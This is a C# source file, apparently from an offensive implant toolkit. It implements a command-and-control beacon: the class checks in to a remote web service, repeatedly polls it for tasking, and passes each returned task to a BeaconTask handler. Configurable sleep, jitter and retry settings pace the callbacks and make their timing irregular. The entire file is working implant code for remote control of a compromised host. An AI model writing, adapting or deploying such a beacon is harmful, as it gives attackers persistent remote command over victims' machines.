using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.ServiceModel;
using System.Threading;

namespace WheresMyImplant
{

    class WebServiceBeacon : IDisposable
    {
        private Dictionary<String, BeaconTask> task = new Dictionary<String, BeaconTask>();

        private String uuid = null;
        private String socket = null;
        private String provider = null;

        private Int32 sleep = 5;
        private Int32 jitter = 2;

        private static Double retriesIncrementerLimit = 1000.00;
        private Double retriesIncrementer = 200.00;

        ////////////////////////////////////////////////////////////////////////////////
        //new NetTcpBinding(),
        //String.Format("net.tcp://{0}:{1}",endpoint, port)
        ////////////////////////////////////////////////////////////////////////////////
        internal WebServiceBeacon(String socket, String provider)
        {
            this.socket = socket;
            this.provider = provider;
        }

        #region sleep
        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void SetSleepInterval(String interval)
        {
            Int32 result = sleep;
            Int32.TryParse(interval, out result);
            SetSleepInterval(result);
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void SetSleepInterval(Int32 interval)
        {
            sleep = interval;
        }
        #endregion

        #region jitter
        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void SetJitter(String interval)
        {
            Int32 result = jitter;
            Int32.TryParse(interval, out result);
            SetJitter(result);
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void SetJitter(Int32 interval)
        {
            jitter = interval;
        }
        #endregion

        #region uuid
        ////////////////////////////////////////////////////////////////////////////////
        // https://stackoverflow.com/questions/1344221/how-can-i-generate-random-alphanumeric-strings-in-c
        ////////////////////////////////////////////////////////////////////////////////
        internal void GenerateUuid(int length)
        {
            Random random = new Random();
            const String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            uuid = new String(Enumerable.Repeat(chars, length).Select(s => s[random.Next(s.Length)]).ToArray());
        }
        #endregion

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void SetRetries(Int32 retries)
        {
            if (0 == retries)
            {
                retriesIncrementer = 0;
                return;
            }
            retriesIncrementer = retriesIncrementerLimit / retries;
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void Run()
        {
            String url = String.Format("http://{0}/{1}", socket, provider);
            GenerateUuid(8);
            if (!WebServiceBeaconComs.Checkin(url, uuid))
            {
                return;
            }

            Double incrementer = 0;
            while (retriesIncrementerLimit > incrementer)
            {
                try
                {
                    String output = "";
                    if (!WebServiceBeaconComs.InvokeRequest(url, "TaskingRequest", new String[] { uuid }, ref output))
                    {
                        Console.WriteLine("{0}/{1}", incrementer, retriesIncrementerLimit);
                        incrementer += retriesIncrementer;
                    }
                    if ("" != output)
                    {
                        BeaconTask task = new BeaconTask(output, uuid, url);
                    }
                }
                catch (Exception error)
                {
                    Console.WriteLine(error);
                }
                finally
                {
                    Thread.Sleep((sleep * 1000) + (new Random().Next(0, jitter) * 1000));
                }
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        public void Dispose()
        {
        }
    }
}